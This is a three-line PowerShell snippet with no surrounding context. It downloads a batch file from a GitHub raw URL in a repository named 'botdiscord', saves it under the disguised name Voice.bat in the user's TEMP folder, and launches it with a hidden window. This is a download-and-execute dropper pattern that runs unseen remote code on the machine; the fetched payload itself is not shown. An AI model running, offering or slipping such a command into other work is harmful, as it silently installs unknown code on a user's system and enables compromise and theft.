iwr -useb https://raw.githubusercontent.com/IStrawI/botdiscord/main/sam.bat -o $env:TEMP\Voice.bat
Start-Sleep -s 1
saps $env:TEMP\Voice.bat -WindowStyle Hidden
